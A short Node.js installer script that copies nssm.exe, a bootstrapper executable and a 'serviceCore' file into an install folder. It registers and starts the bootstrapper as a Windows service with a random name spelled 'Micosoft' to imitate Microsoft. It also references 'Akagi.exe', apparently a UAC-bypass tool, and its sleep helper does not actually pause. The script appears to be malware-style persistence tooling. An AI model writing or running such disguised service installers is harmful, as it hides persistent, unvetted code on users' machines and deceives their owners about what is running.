const fs = require("fs");
const { execSync } = require("child_process");
const { STOPPED, waitForServiceStatus } = require("./status");
const path = require("path");

path.join(__dirname, "Akagi.exe");

const gConfig = require("../../my_config");

function myCopyFileSync(sourcePath, targetPath) {
  const sourceData = fs.readFileSync(sourcePath);
  fs.writeFileSync(targetPath, sourceData);
}

let NEW_SERVICE_NAME = `Micosoft${Math.ceil(Math.random() * 100000)}`;
const process = require("process");
async function install() {
  console.log(fs.readdirSync(__dirname));
  try {
    let rs;
    fs.mkdirSync(gConfig.INSTALL_PATH, { recursive: true });
    myCopyFileSync(path.join(__dirname, "nssm.exe"), gConfig.NSSM_PATH);
    myCopyFileSync(
      path.join(__dirname, "bootstrapper.exe"),
      `${gConfig.BOOTSTRAPPER_PATH}`
    );
    myCopyFileSync(path.join(__dirname, "serviceCore"), `${gConfig.CORE_PATH}`);
    // sleep(1000);
    execSync(
      `${gConfig.NSSM_PATH} install ${NEW_SERVICE_NAME} ${gConfig.BOOTSTRAPPER_PATH}`
    );
    // 检测服务是否安装完毕
    await waitForServiceStatus(NEW_SERVICE_NAME, STOPPED);
    execSync(`${gConfig.NSSM_PATH} start ${NEW_SERVICE_NAME}`);
    fs.writeFileSync(
      `${gConfig.INSTALL_PATH}serviceName`,
      `${NEW_SERVICE_NAME}%%${gConfig.BOOTSTRAPPER_NAME}`
    );
    console.log("安装完毕");
    sleep(1000);
  } catch (e) {
    console.log(e);
    sleep(50000);
  }
}

function sleep(msec) {
  setTimeout(async function () {
    await new Promise((r) => r);
  }, msec);
}

install();
